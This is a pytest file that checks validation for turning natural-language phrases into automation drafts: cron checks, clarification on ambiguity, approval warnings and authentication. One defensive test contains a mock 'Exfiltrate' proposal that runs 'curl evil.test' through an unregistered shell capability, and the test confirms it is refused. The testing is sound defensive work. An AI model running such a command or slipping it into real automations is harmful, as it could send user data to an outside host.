"""
Phase 17: natural-language -> AutomationCreate translation.

runtime_service.generate is patched throughout: the unit under test is the
*validation* layer that decides whether a model proposal may become an
automation, not the model's wording. Patching it also keeps these tests
deterministic and offline, the same reason test_digest.py patches Gmail.

The three phrases exercised here are verbatim from PHASE_17.md's Tests
section.
"""
from unittest.mock import patch

from app.execution.registry import task_registry
from app.services.automation_nl_parser import automation_nl_parser

GENERATE_PATH = "app.services.automation_nl_parser.runtime_service.generate"

PHRASE_FRIDAY = "Every Friday at 5 PM, send me a summary of overdue tasks"
PHRASE_CONTRACTS = "When a new document is added to Contracts, summarize it and notify me"
PHRASE_MONDAY = "Every Monday morning, summarize important emails from last week"


class _Completion:
    """runtime_service.generate's response only needs .completion here."""
    def __init__(self, completion: str):
        self.completion = completion


def _model_says(payload: str):
    return patch(GENERATE_PATH, return_value=_Completion(payload))


# --- The phase's three example phrases ---------------------------------------


def test_friday_overdue_task_summary_becomes_a_scheduled_automation():
    proposal = """{
      "needs_clarification": false,
      "name": "Weekly overdue task summary",
      "trigger_type": "schedule",
      "schedule": "0 17 * * 5",
      "condition": null,
      "steps": [{"step_id": "summarize", "capability": "text_generation",
                 "depends_on": [],
                 "input_template": {"prompt": "Summarize my overdue tasks"}}]
    }"""
    with _model_says(proposal):
        result = automation_nl_parser.parse(PHRASE_FRIDAY)

    assert result.needs_clarification is False
    assert result.draft is not None
    assert result.draft.trigger_type == "schedule"
    assert result.draft.schedule == "0 17 * * 5"
    assert [s.capability for s in result.draft.steps] == ["text_generation"]
    # Drafts are inert until the user confirms them (PHASE_17.md's risk note).
    assert result.draft.enabled is False


def test_new_contract_document_becomes_an_event_triggered_automation():
    proposal = """{
      "needs_clarification": false,
      "name": "Summarize new contracts",
      "trigger_type": "event",
      "schedule": null,
      "condition": {"event_type": "document_ingested"},
      "steps": [{"step_id": "summarize", "capability": "document_summary",
                 "depends_on": [], "input_template": {"text": "{{document.text}}"}}]
    }"""
    with _model_says(proposal):
        result = automation_nl_parser.parse(PHRASE_CONTRACTS)

    assert result.needs_clarification is False
    assert result.draft.trigger_type == "event"
    assert result.draft.condition == {"event_type": "document_ingested"}
    # A schedule is dropped for a non-schedule trigger rather than carried
    # along as dead configuration.
    assert result.draft.schedule is None


def test_monday_email_summary_becomes_a_scheduled_automation():
    proposal = """{
      "needs_clarification": false,
      "name": "Monday email digest",
      "trigger_type": "schedule",
      "schedule": "0 8 * * 1",
      "condition": null,
      "steps": [{"step_id": "digest", "capability": "digest.daily",
                 "depends_on": [], "input_template": {}}]
    }"""
    with _model_says(proposal):
        result = automation_nl_parser.parse(PHRASE_MONDAY)

    assert result.needs_clarification is False
    assert result.draft.schedule == "0 8 * * 1"
    assert result.draft.steps[0].capability == "digest.daily"


# --- Ambiguity: ask, never guess ---------------------------------------------


def test_model_flagged_ambiguity_returns_a_question_and_no_draft():
    with _model_says('{"needs_clarification": true, "clarification": "What time on Monday?"}'):
        result = automation_nl_parser.parse("Every Monday, do the thing")

    assert result.needs_clarification is True
    assert result.draft is None
    assert "Monday" in result.clarification


def test_unparseable_model_output_asks_rather_than_guessing():
    with _model_says("Sure! I have created that automation for you."):
        result = automation_nl_parser.parse(PHRASE_FRIDAY)

    assert result.needs_clarification is True
    assert result.draft is None


def test_generation_failure_asks_rather_than_drafting():
    with patch(GENERATE_PATH, side_effect=RuntimeError("model unreachable")):
        result = automation_nl_parser.parse(PHRASE_FRIDAY)

    assert result.needs_clarification is True
    assert result.draft is None


def test_empty_text_needs_clarification_without_calling_the_model():
    with patch(GENERATE_PATH) as generate:
        result = automation_nl_parser.parse("   ")
    assert result.needs_clarification is True
    generate.assert_not_called()


# --- Security: the NL path cannot exceed the structured path ------------------


def test_unregistered_capability_is_refused_not_drafted():
    """
    The decisive control. A sentence must not be able to name an execution
    path that does not exist -- otherwise the NL route becomes a way to
    propose arbitrary capability strings for a user to click through.
    """
    proposal = """{
      "needs_clarification": false, "name": "Exfiltrate",
      "trigger_type": "schedule", "schedule": "0 3 * * *", "condition": null,
      "steps": [{"step_id": "run", "capability": "shell.exec",
                 "depends_on": [], "input_template": {"cmd": "curl evil.test"}}]
    }"""
    with _model_says(proposal):
        result = automation_nl_parser.parse("Every night at 3am, run a shell command")

    assert result.needs_clarification is True
    assert result.draft is None
    assert "shell.exec" in result.clarification


def test_invalid_cron_is_refused_not_silently_scheduled():
    """An automation that Celery Beat could never parse must fail here,
    not become a row that quietly never fires."""
    proposal = """{
      "needs_clarification": false, "name": "Broken", "trigger_type": "schedule",
      "schedule": "every other blue moon", "condition": null,
      "steps": [{"step_id": "s", "capability": "text_generation",
                 "depends_on": [], "input_template": {}}]
    }"""
    with _model_says(proposal):
        result = automation_nl_parser.parse("Run this on some cadence")

    assert result.needs_clarification is True
    assert result.draft is None


def test_schedule_trigger_without_a_schedule_is_refused():
    proposal = """{
      "needs_clarification": false, "name": "No when", "trigger_type": "schedule",
      "schedule": null, "condition": null,
      "steps": [{"step_id": "s", "capability": "text_generation",
                 "depends_on": [], "input_template": {}}]
    }"""
    with _model_says(proposal):
        result = automation_nl_parser.parse("Summarize my tasks regularly")

    assert result.needs_clarification is True
    assert result.draft is None


def test_event_trigger_without_a_condition_is_refused():
    proposal = """{
      "needs_clarification": false, "name": "No event", "trigger_type": "event",
      "schedule": null, "condition": null,
      "steps": [{"step_id": "s", "capability": "text_generation",
                 "depends_on": [], "input_template": {}}]
    }"""
    with _model_says(proposal):
        result = automation_nl_parser.parse("When something happens, summarize it")

    assert result.needs_clarification is True
    assert result.draft is None


def test_side_effecting_step_is_drafted_but_flagged_as_approval_gated():
    """
    A side-effecting capability is allowed in a draft -- the approval gate
    is enforced at run time by amof_supervisor, not by refusing to draft --
    but the user confirming the draft is told it will park on an approval.
    """
    assert task_registry.get_metadata("gmail.send").requires_human_approval is True

    proposal = """{
      "needs_clarification": false, "name": "Weekly mail", "trigger_type": "schedule",
      "schedule": "0 17 * * 5", "condition": null,
      "steps": [{"step_id": "send", "capability": "gmail.send",
                 "depends_on": [], "input_template": {"to": "me@example.test"}}]
    }"""
    with _model_says(proposal):
        result = automation_nl_parser.parse("Every Friday at 5 PM email me a summary")

    assert result.draft is not None
    assert any("approval" in w for w in result.warnings)


def test_prompt_lists_only_registered_capabilities():
    """The allowlist the model is shown is derived from task_registry, so it
    cannot drift from the allowlist the validator enforces."""
    from app.services.automation_nl_parser import _system_prompt

    prompt = _system_prompt()
    for task_type in task_registry.list_supported_tasks():
        assert task_type in prompt


# --- API surface --------------------------------------------------------------


def test_from_text_endpoint_returns_a_draft_and_persists_nothing(auth_client):
    from app.db.database import SessionLocal
    from app.models.automation import Automation

    proposal = """{
      "needs_clarification": false, "name": "Weekly overdue task summary",
      "trigger_type": "schedule", "schedule": "0 17 * * 5", "condition": null,
      "steps": [{"step_id": "summarize", "capability": "text_generation",
                 "depends_on": [], "input_template": {"prompt": "overdue tasks"}}]
    }"""

    db = SessionLocal()
    try:
        before = db.query(Automation).count()
    finally:
        db.close()

    with _model_says(proposal):
        res = auth_client.post("/api/v1/automations/from-text", json={"text": PHRASE_FRIDAY})

    assert res.status_code == 200, res.text
    body = res.json()
    assert body["needs_clarification"] is False
    assert body["draft"]["schedule"] == "0 17 * * 5"

    db = SessionLocal()
    try:
        assert db.query(Automation).count() == before, "drafting must not create an automation"
    finally:
        db.close()


def test_from_text_endpoint_rejects_anonymous_callers(client):
    res = client.post("/api/v1/automations/from-text", json={"text": PHRASE_FRIDAY})
    assert res.status_code in (401, 403)
